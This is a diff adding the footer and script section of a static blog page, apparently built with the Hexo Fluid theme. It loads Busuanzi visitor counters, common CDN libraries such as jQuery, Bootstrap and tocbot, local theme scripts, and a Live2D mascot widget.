+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
